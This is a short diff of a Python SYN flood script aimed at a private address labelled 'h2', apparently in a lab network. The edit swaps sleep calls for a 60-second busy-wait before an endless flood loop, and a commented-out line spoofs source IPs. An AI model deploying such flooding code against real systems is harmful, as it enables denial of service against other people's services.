@@ -6,9 +6,11 @@ def syn_flood():
     server_ip = "192.168.2.2"  # h2's IP address
     server_port = 12345  # Port to attack
 
-    time.sleep(60)
     print(f"[*] Starting SYN flood attack on {server_ip}:{server_port}...")
 
+    start_time = time.time()
+    while time.time() - start_time < 60:
+        pass
     while True:
         # Generate a random source IP and port for spoofing
         #src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
@@ -30,7 +32,6 @@ def syn_flood():
 
 if __name__ == "__main__":
     #try:
-    time.sleep(60)
     syn_flood()
     #except KeyboardInterrupt:
         #print("\n[!] Stopping SYN flood attack.")
